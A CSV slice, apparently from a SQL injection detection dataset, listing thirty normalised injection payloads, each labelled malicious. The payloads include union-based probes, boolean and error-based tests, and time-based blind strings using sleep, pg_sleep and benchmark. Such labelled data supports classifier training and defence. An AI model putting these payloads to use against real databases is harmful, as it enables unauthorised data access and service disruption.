row_index,payload_norm,label,sqli_type_hint
5610,( select ( case when ( 5603 = 5603 ) then 5603 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),1,
5611,-7775 or 8571 = 8571--,1,
5612,"1 ) ) union all select null,null,null,null,null,null,null,null,null,null--",1,
5613,"-1710"" ) ) as cvky where 1858 = 1858 union all select 1858,1858--",1,
5614,"-7691"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
5615,1 where 7425 = 7425 rlike ( select ( case when ( 4056 = 3196 ) then 1 else 0x28 end ) ) --,1,
5616,"1'|| ( select 'aoad' where 8795 = 8795 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",1,
5617,1%' ) ) ) order by 1--,1,
5618,1 ) as xwgf where 4204 = 4204 and sleep ( 5 ) --,1,
5619,1 ) and 9198 = 9198--,1,
5620,"1 where 8905 = 8905 and make_set ( 7654 = 1923,1923 ) --",1,
5621,"1' ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'xhez' like 'xhez",1,
5622,"1' ) as hvyx where 3194 = 3194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5623,"-3343'|| ( select 'ssvt' where 5179 = 5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",1,
5624,"-9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --",1,
5625,"1, ( select ( case when ( 2970 = 5830 ) then 1 else 2970* ( select 2970 from mysql.db ) end ) )",1,
5626,-3424' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'dyuo' = 'dyuo,1,
5627,"-4176'+ ( select 'muio' where 4256 = 4256 union all select 4256,4256,4256,4256,4256,4256#",1,
5628,"1' and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'qyyg' = 'qyyg",1,
5629,"1 ) ) as bebl where 2597 = 2597 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,
5630,"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1,
5631,"1%' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and '%' = '",1,
5632,1 ) where 3936 = 3936,1,
5633,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""dros"" = ""dros",1,
5634,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,
5635,"1%' ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5636,1%' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( '%' = ',1,
5637,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( '%' = '",1,
5638,"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""cadh"" like ""cadh",1,
5639,"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
